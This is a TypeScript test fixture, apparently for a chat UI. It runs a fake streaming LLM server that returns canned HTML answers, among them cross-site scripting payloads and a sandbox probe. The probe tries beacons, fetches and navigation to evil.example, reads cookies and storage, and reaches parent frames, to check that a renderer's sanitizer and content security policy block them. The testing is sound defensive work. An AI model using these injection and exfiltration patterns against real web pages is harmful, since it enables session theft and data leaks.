import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import type { Seen } from '../backend.ts';

const compact =
  '<p>Here is a comparison.' +
  '<table><caption>Speed</caption><thead><tr><th>Language<th>Speed<th>Curve' +
  '<tbody><tr><th>Go<td>Fast<td>Gentle<tr><th>Rust<td>Faster<td>Steep</table>' +
  '<p>Steps:<ul><li>one<li>two<li>three</ul>' +
  '<aside class="tip"><p>Pick the one you know.</aside>' +
  '<menu><li><button value="Tell me more">More</button></li></menu>';

const strict = '<p>Plain answer.</p>\n<ul>\n<li>a</li>\n<li>b</li>\n</ul>';

const evil =
  '<p onclick="window.__pwned=1">hi <a href="javascript:window.__pwned=1">link</a></p>' +
  '<img src="https://evil.example/x.png" onerror="window.__pwned=1">' +
  '<script>window.__pwned=1</script><style>body{display:none}</style>' +
  '<p style="color:red">styled</p><iframe src="https://evil.example"></iframe><h1>big</h1>' +
  '<aside class="evil" role="note"><p>kind</aside>';

const probe = String.raw`
const out = {}; const viol = [];
addEventListener('securitypolicyviolation', (e) => viol.push(e.violatedDirective));
const attempt = async (name, fn) => {
  const before = viol.length;
  try { const r = await fn(); await new Promise((ok) => setTimeout(ok, 60));
    out[name] = viol.length > before ? 'blocked:csp ' + viol[before] : 'ALLOWED:' + String(r).slice(0, 40); }
  catch (e) { out[name] = 'blocked:' + (e && e.name); }
};
(async () => {
  await attempt('fetch-same-origin', () => fetch('/api/config').then((r) => r.status));
  await attempt('fetch-external', () => fetch('https://evil.example/x').then((r) => r.status));
  await attempt('sendBeacon', () => { if (!navigator.sendBeacon('https://evil.example/b', 'x')) throw new Error('refused'); return 'queued'; });
  await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket('ws://127.0.0.1:1/'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('x')); }));
  await attempt('image-beacon', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = 'https://evil.example/i.png'; }));
  await attempt('dynamic-import', () => import('data:text/javascript,export default 1'));
  await attempt('parent.document', () => parent.document.title);
  await attempt('top.document', () => top.document.title);
  await attempt('localStorage', () => localStorage.length);
  await attempt('cookie', () => document.cookie.length);
  await attempt('indexedDB', () => indexedDB.databases());
  await attempt('window.open', () => { const w = window.open('https://evil.example/'); if (!w) throw new Error('null'); return 'opened'; });
  await attempt('top.location', () => { top.location.href = 'https://evil.example/'; return 'assigned'; });
  await attempt('nested-iframe-script', () => new Promise((ok, no) => { const f = document.createElement('iframe'); f.srcdoc = '<script>parent.__x=1<\/script>'; f.onload = () => ok('loaded'); document.body.append(f); setTimeout(() => no(new Error('t')), 300); }));
  await new Promise((r) => setTimeout(r, 200));
  out.cspViolations = viol.length;
  sendPrompt('PROBE-RESULT ' + JSON.stringify(out));
})();
`;

const widgetProbe = `<p>probe</p><template data-widget title="probe"><script>${probe}</script></template>`;
const slow = `<p>${'word '.repeat(200)}</p>`;

const scripts: Record<string, string> = { compact, strict, evil, slow, widgetprobe: widgetProbe };

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

export interface Fake {
  server: Server;
  url: string;
  seen: Seen[];
  close: () => Promise<void>;
}

export async function startFake(): Promise<Fake> {
  const seen: Seen[] = [];
  const server = createServer(async (req, res) => {
    const chunks: Buffer[] = [];
    for await (const c of req) chunks.push(c as Buffer);
    const body = JSON.parse(Buffer.concat(chunks).toString('utf8') || '{}') as { messages: { content: string }[] };
    seen.push({ auth: req.headers.authorization, body: body as unknown as Record<string, unknown> });
    const last = (body.messages.at(-1)?.content ?? '').toLowerCase();
    const key = Object.keys(scripts).find((k) => last.includes(k)) ?? 'strict';
    const text = scripts[key] as string;
    res.writeHead(200, { 'Content-Type': 'text/event-stream' });
    const send = (delta: Record<string, string>, finish: string | null = null) => res.write(`data: ${JSON.stringify({ choices: [{ delta, finish_reason: finish }] })}\n\n`);
    const step = key === 'slow' ? 5 : 3;
    const pause = key === 'slow' ? 50 : key === 'compact' ? 12 : 4;
    try {
      send({ reasoning_content: 'thinking about it. ' });
      for (let i = 0; i < text.length && !res.destroyed; i += step) {
        send({ content: text.slice(i, i + step) });
        await sleep(pause);
      }
      send({}, 'stop');
      res.end('data: [DONE]\n\n');
    } catch {
      res.destroy();
    }
  });
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address() as AddressInfo;
  return { server, url: `http://127.0.0.1:${port}`, seen, close: () => new Promise((resolve) => server.close(() => resolve())) };
}
